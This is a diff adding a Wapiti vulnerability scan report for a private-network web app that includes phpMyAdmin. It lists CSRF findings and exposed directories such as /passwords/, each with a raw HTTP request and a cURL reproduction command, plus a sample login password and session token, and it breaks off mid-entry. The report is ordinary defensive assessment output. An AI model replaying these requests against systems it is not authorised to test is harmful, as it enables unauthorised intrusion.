@@ -1,0 +1,1183 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Wapiti scan report</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="css/kube.min.css" />
+    <link rel="stylesheet" type="text/css" href="css/master.css" />
+</head>
+<body>
+    <div id="page">
+        <header style="text-align: center">
+        <h2 class="title" style="text-align: center">Wapiti vulnerability report</h2>
+        <h3>Target: http://192.168.1.142:83/</h3>
+        <p>Date of the scan: Sat, 31 Oct 2020 16:23:54 +0000. Scope of the scan: folder</p>
+        </header>
+        <hr />
+        <h4>Summary</h4>
+        <table class="width-100 hovered" style="background: url('logo_clear.png') no-repeat center;">
+            <thead>
+                <tr>
+                    <th>Category</th>
+                    <th>Number of vulnerabilities found</th>
+                </tr>
+            </thead>
+            <tbody id="summary">
+                    <tr>
+                        <td class="small">
+                            SQL Injection
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Blind SQL Injection
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            File Handling
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Cross Site Scripting
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            CRLF Injection
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#vuln_type_5">Cross Site Request Forgery</a>
+                        </td>
+                        <td class="small .text-centered">14</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Commands execution
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Htaccess Bypass
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Backup file
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#vuln_type_9">Potentially dangerous file</a>
+                        </td>
+                        <td class="small .text-centered">9</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Server Side Request Forgery
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Open Redirect
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            XXE
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#anom_type_0">Internal Server Error</a>
+                        </td>
+                        <td class="small .text-centered">9</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#anom_type_1">Resource consumption</a>
+                        </td>
+                        <td class="small .text-centered">1</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#addition_type_0">Fingerprint web technology</a>
+                        </td>
+                        <td class="small .text-centered">3</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            CSP Configuration
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                             HTTP security headers tell the browser how to behave when handling the website's content
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#addition_type_3">HttpOnly Flag cookie</a>
+                        </td>
+                        <td class="small .text-centered">4</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#addition_type_4">Secure Flag cookie</a>
+                        </td>
+                        <td class="small .text-centered">6</td>
+                    </tr>
+            </tbody>
+        </table>
+        <hr />
+        <div id="details">
+                <h3 id="vuln_type_5">Cross Site Request Forgery</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>Cross Site Request Forgery description</dd>
+                </dl>
+
+                        <h4>Vulnerability found in /index.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-5-0-1">Description</a></li>
+                                <li><a href="#tab-vuln-5-0-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-5-0-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-5-0-1" style="min-height: 124px;">
+                            <pre>Lack of anti CSRF token</pre>
+                        </div>
+                        <div id="tab-vuln-5-0-2" style="min-height: 124px;">
+                            <pre>POST /index.php?page=set-background-color.php HTTP/1.1
+Host: 192.168.1.142:83
+Referer: http://192.168.1.142:83/index.php?page=set-background-color.php
+Content-Type: application/x-www-form-urlencoded
+
+background_color=default&amp;set-background-color-php-submit-button=Set+Background+Color</pre>
+                        </div>
+                        <div id="tab-vuln-5-0-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/index.php?page=set-background-color.php&#34; -e &#34;http://192.168.1.142:83/index.php?page=set-background-color.php&#34; -d &#34;background_color=default&amp;set-background-color-php-submit-button=Set+Background+Color&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /index.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-5-1-1">Description</a></li>
+                                <li><a href="#tab-vuln-5-1-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-5-1-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-5-1-1" style="min-height: 124px;">
+                            <pre>Lack of anti CSRF token</pre>
+                        </div>
+                        <div id="tab-vuln-5-1-2" style="min-height: 124px;">
+                            <pre>POST /index.php?page=add-to-your-blog.php HTTP/1.1
+Host: 192.168.1.142:83
+Referer: http://192.168.1.142:83/index.php?page=add-to-your-blog.php
+Content-Type: application/x-www-form-urlencoded
+
+csrf-token=&amp;add-to-your-blog-php-submit-button=Save+Blog+Entry&amp;blog_entry=Hi+there%21</pre>
+                        </div>
+                        <div id="tab-vuln-5-1-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/index.php?page=add-to-your-blog.php&#34; -e &#34;http://192.168.1.142:83/index.php?page=add-to-your-blog.php&#34; -d &#34;csrf-token=&amp;add-to-your-blog-php-submit-button=Save+Blog+Entry&amp;blog_entry=Hi+there%21&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /index.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-5-2-1">Description</a></li>
+                                <li><a href="#tab-vuln-5-2-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-5-2-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-5-2-1" style="min-height: 124px;">
+                            <pre>Lack of anti CSRF token</pre>
+                        </div>
+                        <div id="tab-vuln-5-2-2" style="min-height: 124px;">
+                            <pre>POST /index.php?page=source-viewer.php HTTP/1.1
+Host: 192.168.1.142:83
+Referer: http://192.168.1.142:83/?page=source-viewer.php
+Content-Type: application/x-www-form-urlencoded
+
+page=source-viewer.php&amp;source-file-viewer-php-submit-button=View+File&amp;phpfile=back-button-discussion.php</pre>
+                        </div>
+                        <div id="tab-vuln-5-2-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/index.php?page=source-viewer.php&#34; -e &#34;http://192.168.1.142:83/?page=source-viewer.php&#34; -d &#34;page=source-viewer.php&amp;source-file-viewer-php-submit-button=View+File&amp;phpfile=back-button-discussion.php&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /index.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-5-3-1">Description</a></li>
+                                <li><a href="#tab-vuln-5-3-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-5-3-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-5-3-1" style="min-height: 124px;">
+                            <pre>Lack of anti CSRF token</pre>
+                        </div>
+                        <div id="tab-vuln-5-3-2" style="min-height: 124px;">
+                            <pre>POST /index.php?page=text-file-viewer.php HTTP/1.1
+Host: 192.168.1.142:83
+Referer: http://192.168.1.142:83/index.php?page=text-file-viewer.php
+Content-Type: application/x-www-form-urlencoded
+
+text-file-viewer-php-submit-button=View+File&amp;textfile=http%3A%2F%2Fwww.textfiles.com%2Fhacking%2Fhacking101.hac</pre>
+                        </div>
+                        <div id="tab-vuln-5-3-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/index.php?page=text-file-viewer.php&#34; -e &#34;http://192.168.1.142:83/index.php?page=text-file-viewer.php&#34; -d &#34;text-file-viewer-php-submit-button=View+File&amp;textfile=http%3A%2F%2Fwww.textfiles.com%2Fhacking%2Fhacking101.hac&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /index.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-5-4-1">Description</a></li>
+                                <li><a href="#tab-vuln-5-4-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-5-4-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-5-4-1" style="min-height: 124px;">
+                            <pre>Lack of anti CSRF token</pre>
+                        </div>
+                        <div id="tab-vuln-5-4-2" style="min-height: 124px;">
+                            <pre>POST /index.php?page=xml-validator.php HTTP/1.1
+Host: 192.168.1.142:83
+Referer: http://192.168.1.142:83/index.php?page=xml-validator.php
+Content-Type: application/x-www-form-urlencoded
+
+page=xml-validator.php&amp;xml-validator-php-submit-button=Validate+XML&amp;xml=Hi+there%21</pre>
+                        </div>
+                        <div id="tab-vuln-5-4-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/index.php?page=xml-validator.php&#34; -e &#34;http://192.168.1.142:83/index.php?page=xml-validator.php&#34; -d &#34;page=xml-validator.php&amp;xml-validator-php-submit-button=Validate+XML&amp;xml=Hi+there%21&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /index.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-5-5-1">Description</a></li>
+                                <li><a href="#tab-vuln-5-5-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-5-5-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-5-5-1" style="min-height: 124px;">
+                            <pre>Lack of anti CSRF token</pre>
+                        </div>
+                        <div id="tab-vuln-5-5-2" style="min-height: 124px;">
+                            <pre>POST /index.php?page=repeater.php HTTP/1.1
+Host: 192.168.1.142:83
+Referer: http://192.168.1.142:83/index.php?page=repeater.php
+Content-Type: application/x-www-form-urlencoded
+
+string_to_repeat=default&amp;times_to_repeat_string=default&amp;repeater-php-submit-button=Repeat+String</pre>
+                        </div>
+                        <div id="tab-vuln-5-5-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/index.php?page=repeater.php&#34; -e &#34;http://192.168.1.142:83/index.php?page=repeater.php&#34; -d &#34;string_to_repeat=default&amp;times_to_repeat_string=default&amp;repeater-php-submit-button=Repeat+String&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /index.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-5-6-1">Description</a></li>
+                                <li><a href="#tab-vuln-5-6-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-5-6-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-5-6-1" style="min-height: 124px;">
+                            <pre>Lack of anti CSRF token</pre>
+                        </div>
+                        <div id="tab-vuln-5-6-2" style="min-height: 124px;">
+                            <pre>POST /index.php?page=login.php HTTP/1.1
+Host: 192.168.1.142:83
+Referer: http://192.168.1.142:83/index.php?page=login.php
+Content-Type: application/x-www-form-urlencoded
+
+username=default&amp;password=Letm3in_&amp;login-php-submit-button=Login</pre>
+                        </div>
+                        <div id="tab-vuln-5-6-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/index.php?page=login.php&#34; -e &#34;http://192.168.1.142:83/index.php?page=login.php&#34; -d &#34;username=default&amp;password=Letm3in_&amp;login-php-submit-button=Login&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /phpmyadmin/import.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-5-7-1">Description</a></li>
+                                <li><a href="#tab-vuln-5-7-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-5-7-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-5-7-1" style="min-height: 124px;">
+                            <pre>CSRF token &#39;token&#39; is not properly checked in backend</pre>
+                        </div>
+                        <div id="tab-vuln-5-7-2" style="min-height: 124px;">
+                            <pre>POST /phpmyadmin/import.php HTTP/1.1
+Host: 192.168.1.142:83
+Referer: http://192.168.1.142:83/phpmyadmin/server_sql.php
+Content-Type: multipart/form-data
+
+is_js_confirmed=0&amp;token=ebaa70372723e877f2f17932ef6cea58&amp;pos=0&amp;goto=server_sql.php&amp;message_to_show=Your+SQL+query+has+been+executed+successfully&amp;prev_sql_query=&amp;sql_delimiter=%3B&amp;show_query=1&amp;retain_query_box=1&amp;SQL=Go&amp;sql_query=Hi+there%21</pre>
+                        </div>
+                        <div id="tab-vuln-5-7-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/phpmyadmin/import.php&#34; -e &#34;http://192.168.1.142:83/phpmyadmin/server_sql.php&#34; -H &#34;Content-Type: multipart/form-data&#34; -d @payload_file</pre>
+                        </div>
+                        <h4>Vulnerability found in /phpmyadmin/index.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-5-8-1">Description</a></li>
+                                <li><a href="#tab-vuln-5-8-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-5-8-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-5-8-1" style="min-height: 124px;">
+                            <pre>CSRF token &#39;token&#39; is not properly checked in backend</pre>
+                        </div>
+                        <div id="tab-vuln-5-8-2" style="min-height: 124px;">
+                            <pre>POST /phpmyadmin/index.php HTTP/1.1
+Host: 192.168.1.142:83
+Referer: http://192.168.1.142:83/phpmyadmin/main.php
+Content-Type: application/x-www-form-urlencoded
+
+db=&amp;table=&amp;token=ebaa70372723e877f2f17932ef6cea58&amp;lang=en</pre>
+                        </div>
+                        <div id="tab-vuln-5-8-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/phpmyadmin/index.php&#34; -e &#34;http://192.168.1.142:83/phpmyadmin/main.php&#34; -d &#34;db=&amp;table=&amp;token=ebaa70372723e877f2f17932ef6cea58&amp;lang=en&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /phpmyadmin/prefs_forms.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-5-9-1">Description</a></li>
+                                <li><a href="#tab-vuln-5-9-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-5-9-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-5-9-1" style="min-height: 124px;">
+                            <pre>CSRF token &#39;token&#39; is not properly checked in backend</pre>
+                        </div>
+                        <div id="tab-vuln-5-9-2" style="min-height: 124px;">
+                            <pre>POST /phpmyadmin/prefs_forms.php HTTP/1.1
+Host: 192.168.1.142:83
+Referer: http://192.168.1.142:83/phpmyadmin/prefs_forms.php
+Content-Type: application/x-www-form-urlencoded
+
+tab_hash=&amp;check_page_refresh=&amp;lang=en&amp;token=ebaa70372723e877f2f17932ef6cea58&amp;AjaxEnable=default&amp;VersionCheck=default&amp;NaturalOrder=default&amp;ErrorIconic=default&amp;LoginCookieValidity=1440&amp;ReplaceHelpImg=default&amp;Servers-1-hide_db=&amp;SkipLockedTables=default&amp;DisableMultiTableMaintenance=default&amp;MaxDbList=100&amp;MaxTableList=250&amp;ShowHint=default&amp;submit_save=Save&amp;MinSizeForInputField=4&amp;MaxSizeForInputField=60&amp;CharTextareaCols=40&amp;CharTextareaRows=2&amp;TextareaCols=40&amp;TextareaRows=15&amp;LongtextDoubleTextarea=default&amp;submit_save=Save&amp;TitleDefault=%40HTTP_HOST%40+%7C+%40PHPMYADMIN%40&amp;TitleTable=%40HTTP_HOST%40+%2F+%40VSERVER%40+%2F+%40DATABASE%40+%2F+%40TABLE%40+%7C+%40PHPMYADMIN%40&amp;TitleDatabase=%40HTTP_HOST%40+%2F+%40VSERVER%40+%2F+%40DATABASE%40+%7C+%40PHPMYADMIN%40&amp;TitleServer=%40HTTP_HOST%40+%2F+%40VSERVER%40+%7C+%40PHPMYADMIN%40&amp;submit_save=Save&amp;PmaNoRelation_DisableWarning=default&amp;SuhosinDisableWarning=default&amp;McryptDisableWarning=default&amp;submit_save=Save&amp;InitialSlidersState=closed&amp;CharEditing=input&amp;Servers-1-only_db=Hi+there%21</pre>
+                        </div>
+                        <div id="tab-vuln-5-9-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/phpmyadmin/prefs_forms.php&#34; -e &#34;http://192.168.1.142:83/phpmyadmin/prefs_forms.php&#34; -d &#34;tab_hash=&amp;check_page_refresh=&amp;lang=en&amp;token=ebaa70372723e877f2f17932ef6cea58&amp;AjaxEnable=default&amp;VersionCheck=default&amp;NaturalOrder=default&amp;ErrorIconic=default&amp;LoginCookieValidity=1440&amp;ReplaceHelpImg=default&amp;Servers-1-hide_db=&amp;SkipLockedTables=default&amp;DisableMultiTableMaintenance=default&amp;MaxDbList=100&amp;MaxTableList=250&amp;ShowHint=default&amp;submit_save=Save&amp;MinSizeForInputField=4&amp;MaxSizeForInputField=60&amp;CharTextareaCols=40&amp;CharTextareaRows=2&amp;TextareaCols=40&amp;TextareaRows=15&amp;LongtextDoubleTextarea=default&amp;submit_save=Save&amp;TitleDefault=%40HTTP_HOST%40+%7C+%40PHPMYADMIN%40&amp;TitleTable=%40HTTP_HOST%40+%2F+%40VSERVER%40+%2F+%40DATABASE%40+%2F+%40TABLE%40+%7C+%40PHPMYADMIN%40&amp;TitleDatabase=%40HTTP_HOST%40+%2F+%40VSERVER%40+%2F+%40DATABASE%40+%7C+%40PHPMYADMIN%40&amp;TitleServer=%40HTTP_HOST%40+%2F+%40VSERVER%40+%7C+%40PHPMYADMIN%40&amp;submit_save=Save&amp;PmaNoRelation_DisableWarning=default&amp;SuhosinDisableWarning=default&amp;McryptDisableWarning=default&amp;submit_save=Save&amp;InitialSlidersState=closed&amp;CharEditing=input&amp;Servers-1-only_db=Hi+there%21&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /phpmyadmin/prefs_manage.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-5-10-1">Description</a></li>
+                                <li><a href="#tab-vuln-5-10-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-5-10-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-5-10-1" style="min-height: 124px;">
+                            <pre>CSRF token &#39;token&#39; is not properly checked in backend</pre>
+                        </div>
+                        <div id="tab-vuln-5-10-2" style="min-height: 124px;">
+                            <pre>POST /phpmyadmin/prefs_manage.php HTTP/1.1
+Host: 192.168.1.142:83
+Referer: http://192.168.1.142:83/phpmyadmin/prefs_manage.php
+Content-Type: multipart/form-data; boundary=------------------------boundarystring
+
+------------------------boundarystring
+Content-Disposition: form-data; name=&#34;MAX_FILE_SIZE&#34;
+
+10485760
+------------------------boundarystring
+Content-Disposition: form-data; name=&#34;token&#34;
+
+ebaa70372723e877f2f17932ef6cea58
+------------------------boundarystring
+Content-Disposition: form-data; name=&#34;json&#34;
+
+
+------------------------boundarystring
+Content-Disposition: form-data; name=&#34;import_merge&#34;
+
+default
+------------------------boundarystring
+Content-Disposition: form-data; name=&#34;submit_import&#34;
+
+Go
+------------------------boundarystring
+Content-Disposition: form-data; name=&#34;import_type&#34;
+
+local_storage
+------------------------boundarystring
+Content-Disposition: form-data; name=&#34;import_file&#34;; filename=&#34;pix.gif&#34;
+
+GIF89a
+------------------------boundarystring--</pre>
+                        </div>
+                        <div id="tab-vuln-5-10-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/phpmyadmin/prefs_manage.php&#34; -e &#34;http://192.168.1.142:83/phpmyadmin/prefs_manage.php&#34; -F &#34;MAX_FILE_SIZE=10485760&#34; -F &#34;token=ebaa70372723e877f2f17932ef6cea58&#34; -F &#34;json=&#34; -F &#34;import_merge=default&#34; -F &#34;submit_import=Go&#34; -F &#34;import_type=local_storage&#34; -F &#34;import_file=@your_local_file;filename=pix.gif&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /phpmyadmin/querywindow.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-5-11-1">Description</a></li>
+                                <li><a href="#tab-vuln-5-11-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-5-11-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-5-11-1" style="min-height: 124px;">
+                            <pre>CSRF token &#39;token&#39; is not properly checked in backend</pre>
+                        </div>
+                        <div id="tab-vuln-5-11-2" style="min-height: 124px;">
+                            <pre>POST /phpmyadmin/querywindow.php HTTP/1.1
+Host: 192.168.1.142:83
+Referer: http://192.168.1.142:83/phpmyadmin/querywindow.php
+Content-Type: application/x-www-form-urlencoded
+
+token=ebaa70372723e877f2f17932ef6cea58&amp;db=&amp;table=&amp;sql_query=&amp;querydisplay_tab=sql</pre>
+                        </div>
+                        <div id="tab-vuln-5-11-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/phpmyadmin/querywindow.php&#34; -e &#34;http://192.168.1.142:83/phpmyadmin/querywindow.php&#34; -d &#34;token=ebaa70372723e877f2f17932ef6cea58&amp;db=&amp;table=&amp;sql_query=&amp;querydisplay_tab=sql&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /phpmyadmin/setup/</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-5-12-1">Description</a></li>
+                                <li><a href="#tab-vuln-5-12-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-5-12-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-5-12-1" style="min-height: 124px;">
+                            <pre>CSRF token &#39;token&#39; is not properly checked in backend</pre>
+                        </div>
+                        <div id="tab-vuln-5-12-2" style="min-height: 124px;">
+                            <pre>POST /phpmyadmin/setup/ HTTP/1.1
+Host: 192.168.1.142:83
+Referer: http://192.168.1.142:83/phpmyadmin/setup/
+Content-Type: application/x-www-form-urlencoded
+
+token=ebaa70372723e877f2f17932ef6cea58&amp;lang=en</pre>
+                        </div>
+                        <div id="tab-vuln-5-12-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/phpmyadmin/setup/&#34; -e &#34;http://192.168.1.142:83/phpmyadmin/setup/&#34; -d &#34;token=ebaa70372723e877f2f17932ef6cea58&amp;lang=en&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /phpmyadmin/setup/index.php</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-5-13-1">Description</a></li>
+                                <li><a href="#tab-vuln-5-13-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-5-13-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-5-13-1" style="min-height: 124px;">
+                            <pre>CSRF token &#39;token&#39; is not properly checked in backend</pre>
+                        </div>
+                        <div id="tab-vuln-5-13-2" style="min-height: 124px;">
+                            <pre>POST /phpmyadmin/setup/index.php HTTP/1.1
+Host: 192.168.1.142:83
+Referer: http://192.168.1.142:83/phpmyadmin/setup/index.php
+Content-Type: application/x-www-form-urlencoded
+
+token=ebaa70372723e877f2f17932ef6cea58&amp;lang=en</pre>
+                        </div>
+                        <div id="tab-vuln-5-13-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/phpmyadmin/setup/index.php&#34; -e &#34;http://192.168.1.142:83/phpmyadmin/setup/index.php&#34; -d &#34;token=ebaa70372723e877f2f17932ef6cea58&amp;lang=en&#34;</pre>
+                        </div>
+
+                <dl><dt>Solutions</dt><dd>Cross Site Request Forgery solution</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.html">https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.html</a></li>
+                    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</a></li>
+                    <li><a href="https://owasp.org/www-project-csrfguard/">https://owasp.org/www-project-csrfguard/</a></li>
+                </ul>
+                <br />
+                <hr>
+                <h3 id="vuln_type_9">Potentially dangerous file</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>A file with potential vulnerabilities has been found on the website.</dd>
+                </dl>
+
+                        <h4>Vulnerability found in /data/</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-9-0-1">Description</a></li>
+                                <li><a href="#tab-vuln-9-0-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-9-0-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-9-0-1" style="min-height: 124px;">
+                            <pre>This might be interesting.
+References:
+http://osvdb.org/show/osvdb/3092</pre>
+                        </div>
+                        <div id="tab-vuln-9-0-2" style="min-height: 124px;">
+                            <pre>GET /data/ HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-vuln-9-0-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/data/&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /includes/</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-9-1-1">Description</a></li>
+                                <li><a href="#tab-vuln-9-1-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-9-1-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-9-1-1" style="min-height: 124px;">
+                            <pre>This might be interesting.
+References:
+http://osvdb.org/show/osvdb/3092</pre>
+                        </div>
+                        <div id="tab-vuln-9-1-2" style="min-height: 124px;">
+                            <pre>GET /includes/ HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-vuln-9-1-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/includes/&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /passwords/</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-9-2-1">Description</a></li>
+                                <li><a href="#tab-vuln-9-2-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-9-2-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-9-2-1" style="min-height: 124px;">
+                            <pre>This might be interesting.
+References:
+http://osvdb.org/show/osvdb/3092</pre>
+                        </div>
+                        <div id="tab-vuln-9-2-2" style="min-height: 124px;">
+                            <pre>GET /passwords/ HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-vuln-9-2-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/passwords/&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /test/</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-9-3-1">Description</a></li>
+                                <li><a href="#tab-vuln-9-3-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-9-3-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-9-3-1" style="min-height: 124px;">
+                            <pre>This might be interesting.
+References:
+http://osvdb.org/show/osvdb/3092</pre>
+                        </div>
+                        <div id="tab-vuln-9-3-2" style="min-height: 124px;">
+                            <pre>GET /test/ HTTP/1.1
+Host: 192.168.1.142:83</pre>
+                        </div>
+                        <div id="tab-vuln-9-3-3" style="min-height: 124px;">
+                            <pre>curl &#34;http://192.168.1.142:83/test/&#34;</pre>
+                        </div>
+                        <h4>Vulnerability found in /icons/README</h4>
+                        <nav class="tabs" data-component="tabs" data-equals="true" data-height="equal">
+                            <ul>
+                                <li class="active"><a href="#tab-vuln-9-4-1">Description</a></li>
+                                <li><a href="#tab-vuln-9-4-2">HTTP Request</a></li>
+                                <li><a href="#tab-vuln-9-4-3">cURL command line</a></li>
+                            </ul>
+                        </nav>
+                        <div id="tab-vuln-9-4-1" style="min-height: 124px;">
+                            <pre>Apache default file found.
+References:
